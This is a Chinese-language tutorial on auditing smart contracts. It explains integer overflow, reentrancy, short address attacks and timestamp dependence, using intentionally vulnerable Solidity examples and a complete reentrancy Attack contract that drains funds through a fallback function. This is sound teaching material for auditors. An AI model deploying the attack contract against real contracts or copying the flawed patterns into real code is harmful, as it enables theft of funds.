## 智能合约常见漏洞审计
 **整数溢出**
 在solidity0.8.0开始，加入了自动检查溢出功能，此版本之后的合约,不必担心这个漏洞。
```Solidity
  function batchTransfer(address[] _receivers, uint256 _value) public whenNotPaused returns (bool) {
    uint cnt = _receivers.length;
    uint256 amount = uint256(cnt) * _value;
    require(cnt > 0 && cnt <= 20);
    require(_value > 0 && balances[msg.sender] >= amount);

    balances[msg.sender] = balances[msg.sender].sub(amount);
    for (uint i = 0; i < cnt; i++) {
        balances[_receivers[i]] = balances[_receivers[i]].add(_value);
        Transfer(msg.sender, _receivers[i], _value);
    }
    return true;
  }
```
batchTransfer 函数，它用于给地址列表中的所有地址都转账 _value,
但是没有检查 amount 是否溢出，这导致每个人的转账金额 _value 很大，
但是总共的 amount 却接近0.
所以要引入:library SafeMath {} 来规避掉溢出问题.

**重入攻击**
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract EtherStore {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```
当攻击者调用储币合约中的 withdraw 函数时，withdraw 使用 call 底层调用发送以太币，
此时接收者是攻击者的 fallback 函数，因此如果在 fallback 函数中重新调用 withdraw 函数，
并且没有检查机制，就会发生重入攻击。

**payable函数导致合约余额更新**
当函数执行时，合约会先读取到交易对象，因此合约的余额会变成原来的余额+msg.value,
某些合约可能会未注意到余额的变化而产生漏洞。
**短地址攻击**
因为交易中data参数是原始的调用数据经过ABI编码的数据，ABI规则中常常会为了凑够32字节，在对原始参数编码时进行符号扩充。因此，如果输入的地址太短，那么编码时不会检查，就会直接补零，导致接收者改变。
**挖矿属性依赖**
合约中有部分内置变量，这些变量会受到矿工的影响，因此不应该把它们当作特定的判断条件。
```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
contract Roulette {
    uint public pastBlockTime;
    fallback() external payable {
        require(msg.value == 10 ether);
        require(block.timestamp != pastBlockTime);
        pastBlockTime = block.timestamp;
        if(block.timestamp % 15 == 0){//依赖了区块时间戳
        payable(msg.sender).transfer(address(this).balance);
        }   
    }
}
```



